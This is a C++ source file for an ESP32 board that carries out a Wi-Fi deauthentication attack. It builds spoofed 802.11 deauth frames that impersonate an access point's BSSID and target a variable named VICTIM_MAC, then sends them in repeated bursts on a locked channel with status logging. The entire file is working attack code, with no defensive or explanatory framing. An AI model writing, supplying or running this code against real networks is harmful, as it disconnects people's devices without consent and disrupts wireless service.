#include "deauth_utils.h"
#include "settings_manager.h"
#include <WiFi.h>
#include <esp_wifi.h>

extern uint8_t g_esp32_mac[6];
extern uint8_t g_bssid[6];
extern uint8_t VICTIM_MAC[6];

static bool deauthRunning = false;
static unsigned long lastDeauth = 0;
static int targetChannel = 1;

void deauthStart() {
    deauthRunning = true;
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[*] Deauth started on channel %d\n", targetChannel);
}

void deauthStop() {
    deauthRunning = false;
    Serial.println("[*] Deauth stopped");
}

void deauthSetChannel(int ch) {
    esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("[-] Failed to set channel %d (err: %d)\n", ch, err);
    }
    
    wifi_second_chan_t second;
    uint8_t actualCh;
    esp_wifi_get_channel(&actualCh, &second);
    
    if (actualCh != ch) {
        Serial.printf("[-] Channel %d not supported! Hardware stayed on channel %d\n", ch, actualCh);
        Serial.println("[-] Your ESP32 board is likely 2.4GHz-only.");
    }
    
    targetChannel = actualCh;
}

int deauthUpdate() {
    if (!deauthRunning) return 0;
    unsigned long now = millis();
    if (now - lastDeauth < 1000) return 0;
    lastDeauth = now;
    
    wifi_second_chan_t second;
    uint8_t actualCh;
    esp_wifi_get_channel(&actualCh, &second);
    if (actualCh != targetChannel) {
        targetChannel = actualCh;
        Serial.printf("[!] Channel drifted to %d, re-locking...\n", targetChannel);
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    }
    
    int framesSucesso = 0;
    int framesErro = 0;
    int errosMem = 0;

    for (int i = 0; i < g_settings.deauth_burst; i++) {
        uint8_t frame[26];
        frame[0] = 0xC0; frame[1] = 0x00;
        frame[2] = 0x3A; frame[3] = 0x01;
        memcpy(&frame[4], VICTIM_MAC, 6);
        memcpy(&frame[10], g_bssid, 6);
        memcpy(&frame[16], g_bssid, 6);
        frame[22] = 0x00; frame[23] = 0x00;
        frame[24] = 0x07; frame[25] = 0x00;
        
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
        
        if (err == ESP_OK) {
            framesSucesso++;
        } else if (err == 0x101) {
            errosMem++;
            delay(10);
        } else {
            framesErro++;
        }
        
        delay(2);
    }

    if (errosMem > 0) {
        Serial.printf("[+] Sent: %d | Buffer full (throttled): %d\n", framesSucesso, errosMem);
    } else if (framesErro > 0) {
        Serial.printf("[-] Sent: %d | Errors: %d\n", framesSucesso, framesErro);
    } else {
        Serial.printf("[+] Sent: %d frames\n", framesSucesso);
    }
    
    return framesSucesso;
}
